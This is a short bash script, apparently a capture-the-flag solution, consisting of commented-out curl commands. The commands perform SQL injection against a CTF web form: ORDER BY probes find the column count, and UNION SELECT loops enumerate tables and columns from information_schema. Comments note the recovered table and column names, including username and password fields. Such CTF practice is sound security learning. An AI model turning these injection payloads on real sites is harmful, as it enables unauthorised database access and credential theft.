#!/bin/bash

# These got the number of columns in the table = 3
# curl -d "user=user1' ORDER BY 3 -- '" http://web.camsctf.com/c/facts.php
# curl -d "user=user1' ORDER BY 4 -- '" http://web.camsctf.com/c/facts.php

# These got the table names of all available tables, at offset 65 and 66, we get the table names `quotes` and `s'identifier`
# for i in {64..100}; do
#     echo; echo $i
#     curl -d "user=' UNION SELECT table_name AS user, table_name AS two, table_name AS three FROM information_schema.tables LIMIT 1 OFFSET $i -- '" http://web.camsctf.com/c/facts.php
# done

# These got the column names of the two tables we want: `id`, `user`, `quote` from the `quotes` table
#                                                       `nombre_de_usario`, `kupuhipa` from the `s'identifier` table
# for i in {685..1000}; do
#     echo; echo $i
#     curl -d "user=' UNION SELECT table_name AS user, table_name AS two, column_name AS three FROM information_schema.columns LIMIT 1 OFFSET $i -- '" http://web.camsctf.com/c/facts.php
# done

